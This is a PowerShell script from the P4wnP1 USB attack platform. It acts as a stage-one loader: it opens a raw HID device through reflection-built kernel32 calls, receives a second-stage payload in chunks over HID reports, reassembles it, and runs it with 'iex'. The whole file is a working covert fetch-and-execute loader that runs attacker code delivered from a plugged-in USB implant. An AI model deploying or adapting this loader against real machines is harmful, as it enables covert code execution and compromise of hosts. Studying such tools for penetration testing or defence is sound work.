
#    This file is part of P4wnP1.
#
#    Copyright (c) 2017, Marcus Mengs. 
#
#    P4wnP1 is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    P4wnP1 is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.


# P4wnP1 HID Script
$USB_VID="1D6B"
$USB_PID="0137"

function ReflectCreateFileMethod()
{
    $dom = [AppDomain]::CurrentDomain
    $da = New-Object Reflection.AssemblyName("MaMe82DynAssembly")
    $ab = $dom.DefineDynamicAssembly($da, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mb = $ab.DefineDynamicModule("MaMe82DynModule", $False)
    $tb = $mb.DefineType("MaMe82", "Public, Class")
    $cfm = $tb.DefineMethod("CreateFile", [Reflection.MethodAttributes] "Public, Static", [IntPtr], [Type[]] @([String], [Int32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr] )) 
    $cdi = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $cfa = [Reflection.FieldInfo[]] @([Runtime.InteropServices.DllImportAttribute].GetField("EntryPoint"), [Runtime.InteropServices.DllImportAttribute].GetField("PreserveSig"), [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError"), [Runtime.InteropServices.DllImportAttribute].GetField("CallingConvention"), [Runtime.InteropServices.DllImportAttribute].GetField("CharSet"))
    $cffva = [Object[]] @("CreateFile", $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $cfca = New-Object Reflection.Emit.CustomAttributeBuilder($cdi, @("kernel32.dll"), $cfa, $cffva)
    $cfm.SetCustomAttribute($cfca)
    $tb.CreateType()
}

function CreateFileStreamFromDevicePath($mmcl, [String] $path)
{
    # CreateFile method has to be built in [MaMe82]::CreateFile()
    # call ReflectCreateFileMethod to achieve this

    # Call CreateFile for given devicepath
    # (GENERIC_READ | GENERIC_WRITE) = 0XC0000000
    # FILE_FLAG_OVERLAPPED = 0x40000000;
    $h = $mmcl::CreateFile($path, [Int32]0XC0000000, [IO.FileAccess]::ReadWrite, [IntPtr]::Zero, [IO.FileMode]::Open, [UInt32]0x40000000, [IntPtr]::Zero)

    # Create SafeFileHandle from file 
    #    Note: [Microsoft.Win32.SafeHandles.SafeFileHandle]::new() isn't accessible on PS 2.0 / NET2.0
    #    thus we use reflection to construct FileStream
    #$shandle = [Microsoft.Win32.SafeHandles.SafeFileHandle]::new($devicefile,  [System.Boolean]0)
    $a = $h, [Boolean]0
    $c=[Microsoft.Win32.SafeHandles.SafeFileHandle].GetConstructors()[0]
    $h = $c.Invoke($a)

    # Create filestream from SafeFileHandle
    #$Device = [System.IO.FileStream]::new($h, [System.IO.FileAccess]::ReadWrite, [System.UInt32]32, [System.Boolean]1)
    #    Note: again Reflection has to be used to access the constructor of FileStream
    $fa=[IO.FileAccess]::ReadWrite
    $a=$h, $fa, [Int32]64, [Boolean]1
    $c=[IO.FileStream].GetConstructors()[14]
    return $c.Invoke($a)
}

function send_data($file, $source, $dest, $data, $received)
{

    $i=0
    $bytes = New-Object Byte[] (65)
    $bytes[$i++] = [byte] 0
    $bytes[$i++] = [byte] $source
    $bytes[$i++] = [byte] $dest
    $bytes[$i++] = [byte] $data.Length
    $bytes[$i++] = [byte] $received
    
    $data.CopyTo($bytes, $i)
    
    $devfile.Write($bytes, 0, $bytes.Length)
    
   
}


function read_data($file)
{
    $r = New-Object Byte[] (65)    
    $cr = $devfile.Read($r,0,65)
    
    $i=0
    $report_id = $r[$i++]
    $src = $r[$i++]
    $dst = $r[$i++]
    $snd = $r[$i++]
    $rcv = $r[$i++]
    
    
    $msg = New-Object Byte[] ($snd)
    [Array]::Copy($r, $i, $msg, 0, $snd)
    return $src, $dst, $snd, $rcv, $msg
}

function GetDevicePath($USB_VID, $USB_PID)
{
    $HIDGuid="{4d1e55b2-f16f-11cf-88cb-001111000030}"
    foreach ($wmidev in gwmi Win32_USBControllerDevice |%{[wmi]($_.Dependent)} ) {
        #[System.Console]::WriteLine($wmidev.PNPClass)
	    if ($wmidev.DeviceID -match ("$USB_VID" + '&PID_' + "$USB_PID") -and $wmidev.DeviceID -match ('HID') -and -not $wmidev.Service) {
            $devpath = "\\?\" + $wmidev.PNPDeviceID.Replace('\','#') + "#" + $HIDGuid
        }
    }
    $devpath
}

#######
# Init RAW HID device
#########

# Use Reflection to create [MaMe82]::CreateFile from kernel32.dll
$mmcl = ReflectCreateFileMethod

$path= GetDevicePath $USB_VID $USB_PID
# create FileStream to device
$devfile = CreateFileStreamFromDevicePath $mmcl $path
$count = -1
$stage2 = ""

$empty = New-Object Byte[] (0)
try 
{
    while ($devfile.SafeFileHandle -ne $null)
    {
        
        send_data $devfile 0 0 $empty 0
        $packet = read_data $devfile
        if ($packet[0] -ne 0) 
        { 
            break  # src not 0, no heartbeat (carying stage2)
        }
        if ($packet[1] -ne 0) 
        { 
            break # dst not 0, no heartbeat (carying stage2)
        }
        $utf8 = [Text.Encoding]::UTF8.GetString($packet[4])
        if ($utf8.StartsWith("end_heartbeat") -and ($count -gt 0)) 
        { 
            break 
        } 
        if ($utf8.StartsWith("begin_heartbeat"))
        {
           $count = 0
           [Console]::WriteLine("Start receiving stage2")
        }
        elseif ($count -ge 0)
        {
            # belongs to stream, assemble
            $stage2 += $utf8
            $count += 1
            [Console]::Write(".")
        }
    }
    [Console]::WriteLine("stage2 reassembled")
    iex $stage2
}
finally
{
    # end main thread
    $devfile.Close()
    $devfile.Dispose()
}